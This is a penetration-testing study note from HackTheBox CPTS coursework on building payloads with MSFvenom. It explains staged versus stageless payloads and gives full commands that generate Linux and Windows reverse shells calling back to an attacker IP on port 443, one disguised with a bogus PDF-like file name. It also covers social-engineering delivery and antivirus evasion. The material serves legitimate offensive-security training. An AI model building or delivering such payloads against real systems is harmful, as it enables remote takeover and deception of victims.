---
title: "MSFvenom - Crafting Payloads"
kind: topic
tags:
  - cpts-hackthebox
area: "CPTS HackTheBox"
up: "[[Shells and Payloads]]"
notion-id: 390759b9275180469628de2147a89197
---

# MSFvenom - Crafting Payloads

In: [[Career]] / [[CPTS HackTheBox]] / [[Shells and Payloads]]

## What is MSFvenom

Standalone payload generator (part of Metasploit). Used when you **can't directly reach the target** with Metasploit — instead craft a file, deliver it via social engineering, then catch the connection.

Also supports **encoding/encryption** to bypass AV signatures.

---

## Staged vs Stageless Payloads

| Type | How it works | When to use |
| --- | --- | --- |
| **Staged** | Sends small initial stage → calls back → downloads rest of payload | Good bandwidth, stable connection |
| **Stageless** | Entire payload sent at once, self-contained | Low bandwidth, unstable connection, better evasion |

### How to Tell From the Name

```
linux/x86/shell/reverse_tcp       → STAGED   (/ between shell and reverse_tcp = separate stages)
linux/x86/shell_reverse_tcp       → STAGELESS (shell_reverse_tcp all joined = one piece)

windows/meterpreter/reverse_tcp   → STAGED
windows/meterpreter_reverse_tcp   → STAGELESS
```

---

## MSFvenom Payload Naming Convention

```
[OS]/[arch]/[payload_type]_[connection_method]
```

Examples:

- `linux/x64/shell_reverse_tcp` = Linux, 64-bit, stageless shell, reverse TCP
- `windows/meterpreter/reverse_tcp` = Windows, staged Meterpreter, reverse TCP

---

## Building Payloads

```bash
msfvenom -l payloads
```

### Linux Stageless ELF (reverse shell)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

### Windows Stageless EXE (reverse shell)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

### Flag Breakdown

| Flag | Meaning |
| --- | --- |
| `-p` | Payload to use |
| `LHOST=` | Attacker IP (callback address) |
| `LPORT=` | Attacker port (listener port) |
| `-f elf` | Output format: Linux ELF binary |
| `-f exe` | Output format: Windows executable |
| `> filename` | Output file name |

---

## Delivery Methods

- Email attachment (social engineering).
- Malicious download link on a webpage.
- USB drive (onsite engagement).
- Combined with Metasploit module (if already on internal network).

---

## AV Considerations

- Raw MSFvenom payloads (no encoding) = **almost certainly flagged** by Windows Defender
    - Need encoding (`e`) or encryption to bypass — covered separately
- Linux targets are less likely to have AV but not guaranteed

---

## Key Takeaways

- MSFvenom = **offline payload builder** — useful when you can't reach the target directly through MSF
- Staged = calls home for more; Stageless = self-contained — **choose based on network stability and evasion needs**
- Name convention tells you staged vs stageless: **`/` = staged, `_` joining = stageless**
- Always use **convincing file names** for social engineering delivery
- Raw payloads will be caught by AV — encoding/encryption required for real engagements
- Port 443 as LPORT = blends with HTTPS traffic = less likely blocked outbound
